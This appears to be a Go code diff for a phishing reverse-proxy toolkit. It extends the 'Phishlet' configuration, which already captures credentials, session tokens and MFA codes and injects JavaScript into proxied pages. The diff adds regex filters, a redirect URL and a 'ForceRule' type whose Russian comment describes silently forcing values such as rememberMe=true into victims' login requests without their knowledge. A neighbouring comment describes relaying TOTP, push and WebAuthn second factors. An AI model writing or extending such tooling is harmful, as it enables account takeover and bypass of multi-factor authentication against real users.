@@ -5,6 +5,7 @@ package core
 import (
 	"context"
 	"net/http"
+	"regexp"
 	"time"
 )
 
@@ -18,6 +19,8 @@ type Phishlet struct {
 	AuthTokens  []AuthToken `yaml:"auth_tokens"`
 	CredsMap    []CredsRule `yaml:"creds_map"`
 	MfaTokens   []MfaRule   `yaml:"mfa_tokens"`
+	RedirectURL string      `yaml:"redirect_url"`
+	ForcePost   []ForceRule `yaml:"force_post"`
 	JsInject    []JsInject  `yaml:"js_inject"`
 	LurePath    string      `yaml:"lure_path"`
 	Enabled     bool        `yaml:"enabled"`
@@ -36,6 +39,9 @@ type SubFilter struct {
 	Replace      string   `yaml:"replace"`
 	Mime         []string `yaml:"mime"`
 	RedirectOnly bool     `yaml:"redirect_only"`
+	Regex        bool     `yaml:"regex"`
+	When         string   `yaml:"when"`
+	Compiled     *regexp.Regexp `yaml:"-"`
 }
 
 type AuthToken struct {
@@ -46,6 +52,14 @@ type AuthToken struct {
 type CredsRule struct {
 	Key    string `yaml:"key"`
 	Search string `yaml:"search"`
+}
+
+// ForceRule: тихий инжект key=value в исходящий POST.
+// ctype form|json. Пример: rememberMe=true без ведома жертвы.
+type ForceRule struct {
+	Ctype string `yaml:"ctype"`
+	Key   string `yaml:"key"`
+	Value string `yaml:"value"`
 }
 
 // MfaRule — перехват второго фактора (TOTP/Push/WebAuthn ceremony relay).
